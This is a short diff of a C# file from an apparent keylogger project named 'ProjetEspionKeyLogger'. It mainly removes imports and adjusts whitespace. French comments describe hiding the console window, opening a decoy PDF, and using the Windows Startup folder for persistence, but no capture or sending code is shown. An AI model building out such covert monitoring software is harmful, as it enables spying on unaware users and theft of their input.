@@ -1,10 +1,7 @@
 ﻿using System;
-using System.Windows.Forms;
 using System.Diagnostics;
-using Outlook = Microsoft.Office.Interop.Outlook;
 using System.Net.Mail;
 using System.IO;
-using Microsoft.WindowsAPICodePack.Shell;
 
 namespace ProjetEspionKeyLogger
 {
@@ -12,7 +9,7 @@ namespace ProjetEspionKeyLogger
     {
 
         static void Main(string[] args)
-        {        
+        {
 
 
             //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
@@ -26,7 +23,7 @@ namespace ProjetEspionKeyLogger
             //Ouverture du pdf
             pdf.Start();*/
 
-          
+
             //Dossier des programme a demarer automatiquement
             //C:/Users/Charlie/AppData/Roaming/Microsoft/Windows/start Menu/Programs/Startup
 
@@ -38,6 +35,6 @@ namespace ProjetEspionKeyLogger
             Console.WriteLine("FIN!");
         }
 
-       
+
     }
 }
